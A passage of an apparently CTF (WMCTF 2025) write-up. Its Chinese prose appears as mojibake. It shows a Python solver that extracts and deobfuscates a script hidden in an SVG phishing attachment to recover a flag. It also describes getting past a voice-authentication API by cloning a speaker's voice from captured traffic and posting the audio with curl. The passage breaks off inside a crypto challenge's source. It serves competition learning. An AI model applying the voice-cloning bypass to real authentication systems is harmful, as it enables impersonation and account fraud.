</span></span><span class=line><span class=cl>        <span class=n>filename</span> <span class=o>=</span> <span class=n>part</span><span class=o>.</span><span class=n>get_filename</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>part</span><span class=o>.</span><span class=n>get_payload</span><span class=p>(</span><span class=n>decode</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=ow>or</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>ctype</span> <span class=o>=</span> <span class=n>part</span><span class=o>.</span><span class=n>get_content_type</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>filename</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ctype</span> <span class=ow>not</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;text/plain&#34;</span><span class=p>,</span><span class=s2>&#34;text/html&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=n>payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>filename</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;part</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>out_dir</span> <span class=o>/</span> <span class=n>filename</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_svg</span><span class=p>(</span><span class=n>root</span><span class=p>:</span> <span class=n>Path</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Path</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>cands</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>root</span><span class=o>.</span><span class=n>rglob</span><span class=p>(</span><span class=s2>&#34;*.svg&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>cands</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>FileNotFoundError</span><span class=p>(</span><span class=s2>&#34;No SVG found after extracting EML attachments.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>cands</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;invoice&#34;</span> <span class=ow>in</span> <span class=n>p</span><span class=o>.</span><span class=n>name</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cands</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_script</span><span class=p>(</span><span class=n>svg_text</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>scripts</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;(?is)&lt;script[^&gt;]*&gt;(.*?)&lt;/script&gt;&#39;</span><span class=p>,</span> <span class=n>svg_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>scripts</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;No &lt;script&gt; tag found in SVG.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;</span><span class=se>\n\n</span><span class=s2>/* --- SPLIT --- */</span><span class=se>\n\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>scripts</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_char_map</span><span class=p>(</span><span class=n>js</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;var\s+charMap\s*=\s*\{(.*?)\}\s*;&#39;</span><span class=p>,</span> <span class=n>js</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cmap</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>(</span><span class=n>TOKEN_MAP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>cmap</span>
</span></span><span class=line><span class=cl>    <span class=n>blob</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;[&#34;</span><span class=se>\&#39;</span><span class=s1>]([^&#34;</span><span class=se>\&#39;</span><span class=s1>]+)[&#34;</span><span class=se>\&#39;</span><span class=s1>]\s*:\s*[&#34;</span><span class=se>\&#39;</span><span class=s1>]([^&#34;</span><span class=se>\&#39;</span><span class=s1>]+)[&#34;</span><span class=se>\&#39;</span><span class=s1>]&#39;</span><span class=p>,</span> <span class=n>blob</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>cmap</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cmap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_polymorphic_data</span><span class=p>(</span><span class=n>js</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;var\s+polymorphicData\s*=\s*\[(.*?)\]\s*;&#39;</span><span class=p>,</span> <span class=n>js</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;polymorphicData array not found in SVG script.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>arr_src</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>items</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#39;([^&#39;]+)&#39;&#34;</span><span class=p>,</span> <span class=n>arr_src</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>items</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;polymorphicData seems too short (need &gt;=8 items).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>items</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decode_tokens</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>cmap</span><span class=p>:</span> <span class=nb>dict</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TOKEN_RE</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=k>lambda</span> <span class=n>m</span><span class=p>:</span> <span class=n>cmap</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=s1>&#39;&#39;</span><span class=p>),</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>normalize_flag</span><span class=p>(</span><span class=n>segments</span><span class=p>:</span> <span class=nb>list</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Join, keep only outer braces, drop noisy braces/exclamations inside, and canonicalize words.</span>
</span></span><span class=line><span class=cl>    <span class=n>joined</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>segments</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>first_brace</span> <span class=o>=</span> <span class=n>joined</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;{&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>last_brace</span> <span class=o>=</span> <span class=n>joined</span><span class=o>.</span><span class=n>rfind</span><span class=p>(</span><span class=s1>&#39;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>first_brace</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=ow>and</span> <span class=n>last_brace</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=ow>and</span> <span class=n>last_brace</span> <span class=o>&gt;</span> <span class=n>first_brace</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>head</span> <span class=o>=</span> <span class=n>joined</span><span class=p>[:</span><span class=n>first_brace</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>=</span> <span class=n>joined</span><span class=p>[</span><span class=n>first_brace</span><span class=o>+</span><span class=mi>1</span><span class=p>:</span><span class=n>last_brace</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>tail</span> <span class=o>=</span> <span class=n>joined</span><span class=p>[</span><span class=n>last_brace</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>head</span><span class=p>,</span> <span class=n>body</span><span class=p>,</span> <span class=n>tail</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>joined</span><span class=p>,</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1># strip internal braces and exclamation marks used as noise</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>body</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;{&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;}&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;!&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># fix small obfuscations observed in this sample</span>
</span></span><span class=line><span class=cl>    <span class=n>fixes</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;wmctwf&#39;</span><span class=p>,</span> <span class=s1>&#39;wmctf&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Pchis&#39;</span><span class=p>,</span> <span class=s1>&#39;Phish&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;iAttaic_k&#39;</span><span class=p>,</span> <span class=s1>&#39;Attack_&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Dgeittecit&#39;</span><span class=p>,</span> <span class=s1>&#39;Detection&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;o ng&#39;</span><span class=p>,</span> <span class=s1>&#39;ion&#39;</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;o{ng&#39;</span><span class=p>,</span><span class=s1>&#39;ion&#39;</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;io ng&#39;</span><span class=p>,</span><span class=s1>&#39;ion&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Etvais&#39;</span><span class=p>,</span><span class=s1>&#39;Evasion&#39;</span><span class=p>),</span> <span class=p>(</span><span class=s1>&#39;Etv ais&#39;</span><span class=p>,</span><span class=s1>&#39;Evasion&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;__&#39;</span><span class=p>,</span><span class=s1>&#39;_&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span> <span class=ow>in</span> <span class=n>fixes</span><span class=p>:</span> <span class=n>body</span> <span class=o>=</span> <span class=n>body</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># enforce the canonical phrase</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=s1>&#39;SVG_Phishing_Attack_Detection_Evasion&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1># ensure lowercase prefix</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;(?i)^wmctf\{&#39;</span><span class=p>,</span> <span class=s1>&#39;wmctf{&#39;</span><span class=p>,</span> <span class=n>head</span> <span class=ow>or</span> <span class=s1>&#39;wmctf{&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=s1>&#39;}&#39;</span>  <span class=c1># ensure closing brace</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>head</span> <span class=o>+</span> <span class=n>body</span> <span class=o>+</span> <span class=n>tail</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_path</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>ZIP_PATH</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>zip_path</span><span class=o>.</span><span class=n>exists</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] ZIP not found at hardcoded path: </span><span class=si>{</span><span class=n>zip_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>work</span> <span class=o>=</span> <span class=n>zip_path</span><span class=o>.</span><span class=n>with_suffix</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>)</span>  <span class=c1># e.g., C:\...\mail_phishing</span>
</span></span><span class=line><span class=cl>    <span class=n>unzip</span><span class=p>(</span><span class=n>zip_path</span><span class=p>,</span> <span class=n>work</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>emls</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>work</span><span class=o>.</span><span class=n>rglob</span><span class=p>(</span><span class=s2>&#34;*.eml&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>emls</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] No .eml found after unzip.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>att_root</span> <span class=o>=</span> <span class=n>work</span> <span class=o>/</span> <span class=s2>&#34;_attachments&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>eml</span> <span class=ow>in</span> <span class=n>emls</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=n>att_root</span> <span class=o>/</span> <span class=n>eml</span><span class=o>.</span><span class=n>stem</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>parents</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>parse_eml_attachments</span><span class=p>(</span><span class=n>eml</span><span class=p>,</span> <span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>svg_path</span> <span class=o>=</span> <span class=n>find_svg</span><span class=p>(</span><span class=n>att_root</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>svg_text</span> <span class=o>=</span> <span class=n>svg_path</span><span class=o>.</span><span class=n>read_text</span><span class=p>(</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>js</span> <span class=o>=</span> <span class=n>extract_script</span><span class=p>(</span><span class=n>svg_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>cmap</span> <span class=o>=</span> <span class=n>parse_char_map</span><span class=p>(</span><span class=n>js</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>items</span> <span class=o>=</span> <span class=n>parse_polymorphic_data</span><span class=p>(</span><span class=n>js</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># The real five parts are indices 3..7 (inclusive of start, exclusive of end)</span>
</span></span><span class=line><span class=cl>    <span class=n>real</span> <span class=o>=</span> <span class=n>items</span><span class=p>[</span><span class=mi>3</span><span class=p>:</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>decoded_parts</span> <span class=o>=</span> <span class=p>[</span><span class=n>decode_tokens</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>cmap</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>real</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>normalize_flag</span><span class=p>(</span><span class=n>decoded_parts</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>å»å™ªå½’ä¸€åŒ–å¾—åˆ°wmctf{SVG_Phishing_Attack_Detection_Evasion}</p><h2 id=voice_hacker>Voice_hacker</h2><p>åˆ†æå‰ç«¯ä»£ç æ²¡æœ‰ç›´æ¥çš„å½•éŸ³è€Œæ˜¯é€šè¿‡ä¸¤ä¸ªæ¥å£å®ç°çš„è®¤è¯ï¼Œ<code>/api/fake_audio</code>å’Œ<code>/api/authenticate</code>æœ€åå¯ä»¥é€šè¿‡curlä¸€ä¸ªwavä¸Šå»å®ç°</p><p><a href=https://blog.csdn.net/pyl88429/article/details/102841032>https://blog.csdn.net/pyl88429/article/details/102841032</a></p><p>æµé‡åŒ…ç»™åˆ°çš„udpæŒ‰ç…§å¦‚ä¸Šæ–‡ç« æµç¨‹å¯ä»¥æå–å‡ºä¸€ä¸ªéŸ³é¢‘</p><p><img src=/img/2025-WMCTF/11.png alt=img></p><p>æœ‰é•¿è¾¾2minçš„å¯¹è¯ï¼Œç°åœ¨è¦åšçš„æ˜¯å®ç°<code>ctfå¯åŠ¨</code>çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨åœ¨çº¿ç½‘ç«™</p><p><a href=https://nicevoice.org/zh/>https://nicevoice.org/zh/</a></p><p>å¯¹æå‡ºæ¥çš„éŸ³é¢‘è¿›è¡Œaiå…‹éš†ï¼Œå†æ‰¾ä¸ªç½‘ç«™mp3è½¬wavï¼Œ</p><p><a href=https://cdkm.com/cn/mp3-to-wav>https://cdkm.com/cn/mp3-to-wav</a></p><p>æœ€åæäº¤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>curl -X POST http://62.234.144.69:30635/api/authenticate -F <span class=s2>&#34;audio=@audio_c6560ca3_1758457411069.wav&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-WMCTF/12.png alt=img></p><h1 id=crypto>CRYPTO</h1><h2 id=splitmaster>SplitMaster</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socketserver</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>split_master</span><span class=p>(</span><span class=n>B_decimal</span><span class=p>,</span> <span class=n>segment_bits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>segment_bits</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>sum</span><span class=p>(</span><span class=n>segment_bits</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>512</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>segment_bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>found_combination</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>combinations</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>indices</span> <span class=ow>in</span> <span class=n>combinations</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=n>k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>sum</span><span class=p>(</span><span class=n>segment_bits</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>indices</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>30</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>valid</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>indices</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>indices</span><span class=p>)):</span>
